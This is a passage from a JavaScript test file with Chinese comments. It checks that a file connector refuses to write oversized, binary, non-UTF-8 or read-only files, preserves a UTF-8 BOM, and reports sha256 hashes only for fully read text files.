    expect(text(join(work, 'a.txt'))).toBe('y'.repeat(READ_MAX_BYTES))

    // 原文件超过 1MB：读时 truncated 且没有 hash；就算有人用真 hash 来写也拒绝
    const big = 'z'.repeat(READ_MAX_BYTES + 10)
    put('big.txt', big)
    const got = await read('big.txt')
    expect(got.truncated).toBe(true)
    expect(got.hash).toBeUndefined()
    await expect(write('big.txt', 'short', sha(big))).rejects.toThrow('1MB')
    expect(text(join(work, 'big.txt'))).toBe(big)

    // 二进制：读时没有 hash，写也拒绝
    const bin = Buffer.from([0x89, 0x50, 0, 1, 2])
    put('blob.bin', bin)
    expect((await read('blob.bin')).hash).toBeUndefined()
    await expect(write('blob.bin', 'text', sha(bin))).rejects.toThrow('二进制')
    expect(readFileSync(join(work, 'blob.bin'))).toEqual(bin)

    // 不是 UTF-8（比如 latin1）：网页上看到的是替换字符，写回会毁掉没改的部分
    const latin = Buffer.from([0x63, 0xe9, 0x0a])
    put('latin.txt', latin)
    await expect(write('latin.txt', 'c?\n', sha(latin))).rejects.toThrow('UTF-8')
    expect(readFileSync(join(work, 'latin.txt'))).toEqual(latin)

    // 主人设成只读的文件不让改（rename 能绕过权限位，所以 connector 自己守）
    const ro = put('ro.txt', 'locked')
    chmodSync(join(work, 'ro.txt'), 0o444)
    await expect(write('ro.txt', 'x', ro)).rejects.toThrow('只读')
    expect(text(join(work, 'ro.txt'))).toBe('locked')
  })

  test('UTF-8 BOM：网页上看不到它，写回时补上（不悄悄改文件的编码标记）；hash 对的是整份字节', async () => {
    const withBom = Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from('hello\n')])
    const base = put('bom.txt', withBom)
    const got = await read('bom.txt')
    expect(got.hash).toBe(base)
    expect(got.text).toBe('hello\n')
    const done = await write('bom.txt', 'hello world\n', base)
    const after = readFileSync(join(work, 'bom.txt'))
    expect([...after.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf])
    expect(after.subarray(3).toString()).toBe('hello world\n')
    expect(done.hash).toBe(sha(after))
  })

  test('读：完整的文本文件带 sha256；恰好 1MB 也算读全了', async () => {
    put('a.txt', 'abc')
    expect((await read('a.txt')).hash).toBe(sha('abc'))
    put('exact.txt', 'x'.repeat(READ_MAX_BYTES))
    expect((await read('exact.txt')).hash).toBe(sha('x'.repeat(READ_MAX_BYTES)))
  })
})
